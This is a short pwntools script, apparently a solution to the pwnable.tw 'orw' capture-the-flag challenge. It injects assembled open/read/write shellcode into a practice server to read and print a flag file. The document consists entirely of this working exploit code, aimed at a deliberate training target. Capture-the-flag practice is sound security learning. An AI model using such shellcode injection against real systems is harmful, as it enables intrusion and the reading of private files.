from pwn import *
r = remote('chall.pwnable.tw',10001)
r.recvuntil('shellcode:')
buf = ''
buf += asm(shellcraft.open('/home/orw/flag'))
buf += asm(shellcraft.read('eax', 'esp', 40))
buf += asm(shellcraft.write(1, 'esp', 40))
r.sendline(buf)
print r.recv()
r.close()

